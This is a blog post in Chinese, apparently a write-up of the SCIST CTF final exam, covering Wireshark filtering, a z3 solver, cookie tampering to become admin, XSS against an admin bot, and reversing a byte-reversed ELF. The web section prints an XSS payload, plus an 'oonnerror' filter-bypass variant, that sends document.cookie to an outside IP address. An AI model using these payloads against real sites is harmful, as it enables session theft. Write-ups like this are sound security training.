@@ -1,0 +1,307 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>SCIST Final Exam | HackThe4O4</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="平台 wELCOMEF12開起來，FLAG藏裡面 MiscIntruder 1&#x2F;3這題的wireshark檔案在過濾後好像是這些奇怪的來源?因為Huge Ports 大埠通訊的來源通常都怪怪的dns or ((tcp.srcport &gt;&#x3D;1024 and tcp.dstport &gt;&#x3D;1024) and (tcp.flags.syn&#x3D;&#x3D;1 or tcp.flags.fin&#x3D;&#x3D;1">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SCIST Final Exam">
+<meta property="og:url" content="https://no-flag.com/2024/12/21/SCIST_final/index.html">
+<meta property="og:site_name" content="HackThe4O4">
+<meta property="og:description" content="平台 wELCOMEF12開起來，FLAG藏裡面 MiscIntruder 1&#x2F;3這題的wireshark檔案在過濾後好像是這些奇怪的來源?因為Huge Ports 大埠通訊的來源通常都怪怪的dns or ((tcp.srcport &gt;&#x3D;1024 and tcp.dstport &gt;&#x3D;1024) and (tcp.flags.syn&#x3D;&#x3D;1 or tcp.flags.fin&#x3D;&#x3D;1">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://i.imgur.com/gpHhMXK.png">
+<meta property="og:image" content="https://i.imgur.com/EuX2hiT.png">
+<meta property="og:image" content="https://i.imgur.com/wnhJ6eW.png">
+<meta property="og:image" content="https://i.imgur.com/oj94ZLN.png">
+<meta property="og:image" content="https://i.imgur.com/Q84Ifpy.png">
+<meta property="og:image" content="https://i.imgur.com/ffN3pV1.png">
+<meta property="og:image" content="https://i.imgur.com/YW8iekl.png">
+<meta property="og:image" content="https://i.imgur.com/6JsxjQE.png">
+<meta property="og:image" content="https://i.imgur.com/xP5zszv.png">
+<meta property="og:image" content="https://i.imgur.com/MvAQZmt.png">
+<meta property="og:image" content="https://i.imgur.com/QCaGOUG.png">
+<meta property="og:image" content="https://i.imgur.com/YQEVzxJ.png">
+<meta property="og:image" content="https://i.imgur.com/bSEwyxf.png">
+<meta property="og:image" content="https://i.imgur.com/yb4S9SP.png">
+<meta property="og:image" content="https://i.imgur.com/y9HzSmG.png">
+<meta property="og:image" content="https://i.imgur.com/6gi229J.png">
+<meta property="og:image" content="https://i.imgur.com/GGGNbax.png">
+<meta property="article:published_time" content="2024-12-21T12:32:07.094Z">
+<meta property="article:modified_time" content="2024-04-03T17:44:42.362Z">
+<meta property="article:author" content="Noflag">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.imgur.com/gpHhMXK.png">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+	<!-- If needed, replace your own web font service -->
+  <link href="https://fonts.googleapis.com/css?family=Crimson+Text:400,700|Inconsolata|Oswald" rel="stylesheet" />
+
+  
+   
+  
+<link rel="stylesheet" href="/icomoon/style.css">
+
+  
+<link rel="stylesheet" href="/style.css">
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+  <div class="site-wrapper is_post_page">
+    <div id="loading-bar-wrapper">
+  <div id="loading-bar"></div>
+</div>
+<script>document.getElementById("loading-bar").style.width="20%";</script>
+
+
+<header id="header" class="site-header clearfix">
+
+  <a class="logo square clearfix" href="/">
+    <!-- 
+      Replace with your own size name, for example:
+      <span class="b">A</span>
+      <span class="w">B</span>
+      <span class="b">C</span>
+     -->
+     <span class="b">A</span>
+     <span class="b">R</span>
+     <span class="b">T</span>
+     <span class="w">I</span>
+     <span class="w">F</span>
+     <span class="b">A</span>
+     <span class="b">C</span>
+     <span class="b">T</span>
+  </a>
+  <a class="me square site-nav-switch clearfix">
+    <span class="b">
+    	<span class="icon icon-menu"></span>
+    </span>
+  </a>
+
+</header>
+
+    <script>document.getElementById("loading-bar").style.width="40%";</script>
+    <main id="main" class="clearfix">
+      <article id="post-SCIST_final"
+  class="article white-box article-type-post"
+  itemscope itemprop="blogPost">
+
+  <header class="article-header">
+    <h1 class="article-title" itemprop="name">
+      SCIST Final Exam
+    </h1>
+    <div class="article-meta">
+      Posted on 
+      <time class="article-time" datetime="2024-12-21T12:32:07.094Z" itemprop="datePublished">
+        Dec 21, 2024
+      </time>
+    </div>
+  </header>
+
+  <div class="article-entry" itemprop="articleBody">
+    <p><a target="_blank" rel="noopener" href="https://ctf.scist.org/challenges">平台</a><br><img src="https://i.imgur.com/gpHhMXK.png"></p>
+<h2 id="wELCOME"><a href="#wELCOME" class="headerlink" title="wELCOME"></a>wELCOME</h2><p>F12開起來，FLAG藏裡面<br><img src="https://i.imgur.com/EuX2hiT.png"></p>
+<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Intruder-1-3"><a href="#Intruder-1-3" class="headerlink" title="Intruder 1&#x2F;3"></a>Intruder 1&#x2F;3</h3><p><img src="https://i.imgur.com/wnhJ6eW.png"><br>這題的wireshark檔案在過濾後好像是這些奇怪的來源?因為Huge Ports 大埠通訊的來源通常都怪怪的<br><code>dns or ((tcp.srcport &gt;=1024 and tcp.dstport &gt;=1024) and (tcp.flags.syn==1 or tcp.flags.fin==1 or tcp.flags.reset==1))</code><br><img src="https://i.imgur.com/oj94ZLN.png"><br>後來打算先看看decryption key裡面有沒有其他線索，用IDA反解過去，flag就出來嘞<br><img src="https://i.imgur.com/Q84Ifpy.png"></p>
+<h3 id="FruteForce"><a href="#FruteForce" class="headerlink" title="FruteForce?"></a>FruteForce?</h3><p><img src="https://i.imgur.com/ffN3pV1.png"></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> Real, BitVecRef, BitVecVal, Int, Extract, Solver, SolverFor, Concat, Or, And, If, sat, simplify, LShR, Sum, URem, UDiv, set_option, Tactic</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    x = [Int(<span class="string">&#x27;apple&#x27;</span>), Int(<span class="string">&#x27;orange&#x27;</span>), Int(<span class="string">&#x27;lemon&#x27;</span>)]</span><br><span class="line">    s = Solver()</span><br><span class="line">    s.add(x[<span class="number">0</span>]*x[<span class="number">0</span>]+x[<span class="number">1</span>]*x[<span class="number">1</span>] == <span class="number">256325</span>)</span><br><span class="line">    s.add(x[<span class="number">0</span>]*x[<span class="number">2</span>] == x[<span class="number">1</span>]*<span class="number">13910</span>+<span class="number">441</span>)</span><br><span class="line">    <span class="keyword">while</span> (t := s.check()) == sat:</span><br><span class="line">        m = s.model()</span><br><span class="line">        <span class="built_in">print</span>(m)</span><br><span class="line">        apple, orange, lemon = [m[x[i]].as_long() <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x))]</span><br><span class="line">        <span class="built_in">print</span>(<span class="number">3</span>**apple == (orange**<span class="number">3</span>+lemon))</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">pow</span>(orange, apple, lemon))</span><br><span class="line">        s.add(Or([x[i] != m[x[i]].as_long() <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x))]))</span><br><span class="line">    <span class="built_in">print</span>(t)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>這題其實很玄，因為一開始用z3正常的方式解三元方程式可是一直解不出答案，後來換個方式去算<br><img src="https://i.imgur.com/YW8iekl.png"></p>
+<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="Are-you-admin"><a href="#Are-you-admin" class="headerlink" title="Are you admin?"></a>Are you admin?</h3><p>登入後發現有一個 &#x2F;flag1 的頁面，不過 get 該頁面時會回傳 <code>&#123;&quot;done&quot;:false,&quot;msg&quot;:&quot;Not admin :(&quot;&#125;</code>, 發現 cookie 中有一個 is_admin，當 is_admin 為 true 時，便能成功讀取 &#x2F;flag 頁面中的 flag。<br><img src="https://i.imgur.com/6JsxjQE.png"><br><img src="https://i.imgur.com/xP5zszv.png"></p>
+<h3 id="Login-as-ADMIN"><a href="#Login-as-ADMIN" class="headerlink" title="Login as ADMIN ?"></a>Login as ADMIN ?</h3><p>接着發現網站上有兩個頁面 &#x2F;note.html 以及 &#x2F;share, &#x2F;note 中有一個能夠上傳字串到服務器的功能（類似論壇）,或許會有 XSS 的問題。同過 payload: <code>&lt;h1&gt;aaaaaa&lt;/h1&gt;</code> 的測試後發現 XSS 問題確實存在。</p>
+<p>接着 &#x2F;report 頁面似乎提供服務器主動訪問目標 url 的功能，首先來驗證服務器是否對外連網，可以使用 <code>python3 -m http.server &lt;your_port&gt;</code> 或是 <code>tcpdump -i &lt;your_interface&gt; port &lt;your port&gt;</code> 進行測試，驗證了服務器有對外連線。<br><img src="https://i.imgur.com/MvAQZmt.png"></p>
+<p>看起來 &#x2F;report 頁面會使服務器用 get 方式訪問 url，因此這裡或許可以使用不需要 victim 互動的 reflected XSS。</p>
+<p>在 notes 頁面中通過 payload:<code>&lt;img src=x onerror=this.src=&#39;http://27.147.28.70:9945/?&#39;+document.cookie;&gt;</code> 驗證此 payload 的有效性<br><img src="https://i.imgur.com/QCaGOUG.png"></p>
+<p>不過在 share 頁面中卻無效了，review 過 &#x2F;share 頁面的原始碼後發現該頁面有客戶端的 filter，該 filter 會將 on 以及 ig 字串刪除。</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">(<span class="title function_">async</span> () =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; done, note &#125; = <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">&#x27;/share&#x27;</span>+location.<span class="property">search</span>).<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> res.<span class="title function_">json</span>())</span><br><span class="line">    <span class="keyword">if</span> (!done) <span class="keyword">return</span> <span class="title function_">alert</span>(msg || <span class="string">&quot;Unknown error&quot;</span>)</span><br><span class="line">    content.<span class="property">innerHTML</span> = (note || <span class="string">&quot;&quot;</span>).<span class="title function_">replaceAll</span>(<span class="string">&#x27;&lt;/pre&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>).<span class="title function_">replaceAll</span>(<span class="regexp">/on/ig</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">&#125;)()</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>而想要繞過也很簡單，我們可以將 onerror 修改為 oonnerror，因此整體 payload 為：<code>&lt;img src=x oonnerror=this.src=&#39;http://27.147.28.70:9945/?&#39;+document.cookie;&gt;</code><br>將含有該 payload 的 &#x2F;share 頁面作為 &#x2F;report 頁面的 url 後，相當於對服務器主機發起 reflect XSS 攻擊，最終能成功取得主機的 cookie。<br><img src="https://i.imgur.com/YQEVzxJ.png"></p>
+<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="Vault"><a href="#Vault" class="headerlink" title="Vault"></a>Vault</h3><p>使用 <a target="_blank" rel="noopener" href="https://github.com/rocky/python-uncompyle6/">uncompyle6</a> 將 .pyc 逆向回 .py，<br>可以發現 .py 中驗證機制如何運作，<br>密碼是 20 位數字，具體我忘了，但反正有 flag 就好 科科<br><img src="https://i.imgur.com/bSEwyxf.png"></p>
+<h3 id="Reverse-1"><a href="#Reverse-1" class="headerlink" title="Reverse"></a>Reverse</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">❯ file reverse</span><br><span class="line">reverse: data</span><br><span class="line">❯ xxd reverse</span><br><span class="line">00000000: 0000 0000 0000 0000 0000 0000 0000 0001  ................</span><br><span class="line">&lt;skip&gt;</span><br><span class="line">00004830: 4429 0f20 3a67 6e69 7274 73b8 4800 4824  D). :gnirts.H.H$</span><br><span class="line">00004840: 44c6 3024 7c8d 48c0 3100 0000 d824 8489  D.0$|.H.1....$..</span><br><span class="line">&lt;skip&gt;</span><br><span class="line">000053a0: 0000 0000 0000 656c 6261 5465 6e6f 6c43  ......elbaTenolC</span><br><span class="line">000053b0: 4d54 7265 7473 6967 6572 5f4d 5449 5f00  MTretsiger_MTI_.</span><br><span class="line">000053c0: 5f5f 7472 6174 735f 6e6f 6d67 5f5f 0065  __trats_nomg__.e</span><br><span class="line">000053d0: 6c62 6154 656e 6f6c 434d 5472 6574 7369  lbaTenolCMTretsi</span><br><span class="line">000053e0: 6765 7265 645f 4d54 495f 0035 2e32 2e32  gered_MTI_.5.2.2</span><br><span class="line">000053f0: 5f43 4249 4c47 0034 2e32 5f43 4249 4c47  _CBILG.4.2_CBILG</span><br><span class="line">00005400: 0034 2e33 2e32 5f43 4249 4c47 0037 2e32  .4.3.2_CBILG.7.2</span><br><span class="line">00005410: 5f43 4249 4c47 006e 6961 6d5f 7472 6174  _CBILG.niam_trat</span><br><span class="line">00005420: 735f 6362 696c 5f5f 0070 6d63 7274 7300  s_cbil__.pmcrts.</span><br><span class="line">00005430: 6b68 635f 6674 6e69 7270 735f 5f00 657a  khc_ftnirps__.ez</span><br><span class="line">00005440: 696c 616e 6966 5f61 7863 5f5f 006e 656c  ilanif_axc__.nel</span><br><span class="line">00005450: 7274 7300 6c69 6166 5f6b 6863 5f6b 6361  rts.liaf_khc_kca</span><br><span class="line">00005460: 7473 5f5f 0073 7475 7000 666e 6163 735f  ts__.stup.fnacs_</span><br><span class="line">00005470: 3939 636f 7369 5f5f 0062 6f72 666d 656d  99cosi__.borfmem</span><br><span class="line">00005480: 006b 6863 5f66 746e 6972 705f 5f00 362e  .khc_ftnirp__.6.</span><br><span class="line">00005490: 6f73 2e63 6269 6c00 0000 0000 0000 0000  os.cbil.........</span><br><span class="line">&lt;skip&gt;</span><br><span class="line">00005920: 0000 0000 0000 0318 0000 0000 0000 0318  ................</span><br><span class="line">00005930: 0000 0004 0000 0003 0000 0000 0000 0008  ................</span><br><span class="line">00005940: 0000 0000 0000 02d8 0000 0000 0000 02d8  ................</span><br><span class="line">00005950: 0000 0000 0000 0040 0000 0000 0000 0040  .......@.......@</span><br><span class="line">00005960: 0000 0000 0000 0040 0000 0004 0000 0006  .......@........</span><br><span class="line">00005970: 0025 0026 0040 000d 0038 0040 0000 0000  .%.&amp;.@...8.@....</span><br><span class="line">00005980: 0000 0000 0000 5030 0000 0000 0000 0040  ......P0.......@</span><br><span class="line">00005990: 0000 0000 0000 12a0 0000 0001 003e 0003  .............&gt;..</span><br><span class="line">000059a0: 0000 0000 0000 0000 0001 0102 464c 457f  ............FLE.</span><br></pre></td></tr></table></figure>
+
+<p>看到最後的 FLE. 以及中間的字串基本能確定這是一個經過了翻轉的 ELF 檔案。 </p>
+<p>查到<a target="_blank" rel="noopener" href="https://unix.stackexchange.com/questions/416401/how-to-reverse-the-content-of-binary-file">本網站</a>，把整個檔案倒過來：<code>&lt; reverse xxd -p -c1 | tac | xxd -p -r &gt; reverse_out</code></p>
+<p>使用 ghidra 的反編譯進行逆向後可見：<br><img src="https://i.imgur.com/yb4S9SP.png"></p>
+<p>單純反組譯：<br><img src="https://i.imgur.com/y9HzSmG.png"></p>
+<p>使用動態分析方式在 <code>call memfrob</code> 後下斷點，然後直接觀察 magic 變數的值。<br><img src="https://i.imgur.com/6gi229J.png"><br>var_8h（也就是 magic）的 hex 值轉換為 ASCII 為 “esrever”</p>
+<p><img src="https://i.imgur.com/GGGNbax.png"></p>
+
+  </div>
+  
+  <div class="article-tags">
+    
+  </div>
+
+  
+
+</article>
+
+      <script>document.getElementById("loading-bar").style.width="60%";</script>
+    </main>
+    
+<footer id="footer" class="clearfix">
+	
+  <div>&copy; <a href="https://no-flag.com">HackThe4O4</a> Theme by <a href="http://artifact.me/" target="_blank">Art Chen</a>.</div>
+  <div>Powered by <a target="_blank" href="https://hexo.io/" rel="external noopener">Hexo</a>.</div>
+</footer>
+
+
+    <script>document.getElementById("loading-bar").style.width="80%";</script>
+    <div class="overlay"></div>
+  </div>
+  <div class="site-sidebar">
+
+	
+	
+	<div class="sidebar-switch clearfix "
+		style="display: none">
+		<a class="dark-btn active" data-toggle="toc">
+	    <span class="icon icon-list"></span>
+	    <span class="text">Index</span>
+	  </a>
+	  <a class="dark-btn" data-toggle="bio">
+	    <span class="icon icon-person"></span>
+	    <span class="text">Bio</span>
+	  </a>
+	</div>
+
+	<div class="site-toc "
+		style="display: none">
+		
+	    <div class="no-index">No Index</div>
+	  
+  </div>
+  
+	<div class="site-bio show"
+		style="display: block">
+		
+	  <!-- About Me -->
+	  <div class="about-me clearfix">
+	    <div class="avatar">
+	      <img src="/img/avatar.png" />
+	    </div>
+	    <div class="info">
+	      <a class="name dark-btn" href="/about">
+	        Noflag
+	      </a>
+	    </div>
+	    <div class="info">
+	      <span class="item desc">
+	        Documenting the journey of cyber security
+	      </span>
+	    </div>
+	  </div>
+	
+	  <!-- Social Icons -->
+	  <div class="social clearfix">
+	    
+	      
+	        <a href="/atom.xml" class="feed"
+	          target="_blank" rel="external">
+	          <span class="icon icon-feed"></span>
+	        </a>
+	      
+	        <a href="https://github.com/artchen" class="github"
+	          target="_blank" rel="external">
+	          <span class="icon icon-github"></span>
+	        </a>
+	      
+	    
+	  </div>
+
+	</div>
+
+	<div class="shortcuts">
+		<a href="#header" class="top window-nav dark-btn" id="go-top">
+			<span class="icon icon-chevron-thin-up"></span>
+		</a>
+		<a class="close dark-btn" id="sidebar-close">
+			<span class="icon icon-close"></span>
+		</a>
+		<a href="#footer" class="top window-nav dark-btn" id="go-bottom">
+			<span class="icon icon-chevron-thin-down"></span>
+		</a>
+	</div>
+
+</div>
+
+  <!-- Universal Search -->
+
+<script type="text/javascript">
+  var GOOGLE_CUSTOM_SEARCH_API_KEY = "";
+  var GOOGLE_CUSTOM_SEARCH_ENGINE_ID = "";
+  var ALGOLIA_API_KEY = "";
+  var ALGOLIA_APP_ID = "";
+  var ALGOLIA_INDEX_NAME = "";
+  var AZURE_SERVICE_NAME = "";
+  var AZURE_INDEX_NAME = "";
+  var AZURE_QUERY_KEY = "";
+  var BAIDU_API_ID = "";
+  var SEARCH_SERVICE = "google";
+  var universalSearchConfig = {};
+  if (SEARCH_SERVICE === 'google') {
+    universalSearchConfig = {
+      searchService: SEARCH_SERVICE,
+      apiKey: GOOGLE_CUSTOM_SEARCH_API_KEY,
+      engineId: GOOGLE_CUSTOM_SEARCH_ENGINE_ID,
+      imagePath: "/img/"
+    };
+  } else if (SEARCH_SERVICE === 'algolia') {
+    universalSearchConfig = {
+      searchService: SEARCH_SERVICE,
+      apiKey: ALGOLIA_API_KEY,
+      appId: ALGOLIA_APP_ID,
+      indexName: ALGOLIA_INDEX_NAME,
+      imagePath: "/img/"
+    };
+  } else if (SEARCH_SERVICE === 'azure') {
+    universalSearchConfig = {
+      searchService: SEARCH_SERVICE,
+      serviceName: AZURE_SERVICE_NAME,
+      indexName: AZURE_INDEX_NAME,
+      apiKey: AZURE_QUERY_KEY,
+      imagePath: "/img/"
+    };
+  }
+</script>
+
+<script src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
+<script>window.jQuery || document.write('<script src="/js/jquery.js"><\/script>')</script>
+
+
+<script src="/js/search.js"></script>
+
+
+<script src="/js/app.js"></script>
+
+
+<!-- Disqus -->
+
+
+
+<!-- Valine -->
+
+
+<!-- Swiftype -->
+<!-- Please replace with your own swiftype settings -->
+<!--
+<script type="text/javascript">
+  /* Swiftype */
+  (function(w,d,t,u,n,s,e){w['SwiftypeObject']=n;w[n]=w[n]||function(){
+  (w[n].q=w[n].q||[]).push(arguments);};s=d.createElement(t);
+  e=d.getElementsByTagName(t)[0];s.async=1;s.src=u;e.parentNode.insertBefore(s,e);
+  })(window,document,'script','//s.swiftypecdn.com/install/v2/st.js','_st');
+
+  _st('install','FHMeAyBdVccJECstf-XJ','2.0.0');
+</script>
+-->
+
+  <script>document.getElementById("loading-bar").style.width="100%";</script>
+</body>
+</html>
